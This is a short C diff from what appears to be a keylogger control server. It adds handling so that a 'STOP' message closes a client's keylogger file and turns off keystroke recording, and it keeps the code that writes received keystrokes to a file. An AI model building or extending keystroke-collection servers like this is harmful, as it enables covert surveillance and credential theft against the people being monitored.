@@ -20,6 +20,12 @@ void handleOpcode(message_t msg, int clientSock)
     switch (msg.opCode)
     {
         case 'K':
+        if(strcmp(msg.buffer, "STOP") == 0)
+        {
+            close(clientHndler.clientsAttr[clientSock].keylogger_fd);
+            clientHndler.clientsAttr[clientSock].keylogger_fd = -1;
+            clientHndler.clientsAttr[clientSock].recordKeys = 0;
+        }
         if(clientHndler.clientsAttr[clientSock].recordKeys)
             {
                 //printf("Should write to file %d, buffer: %s; size: %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd, 
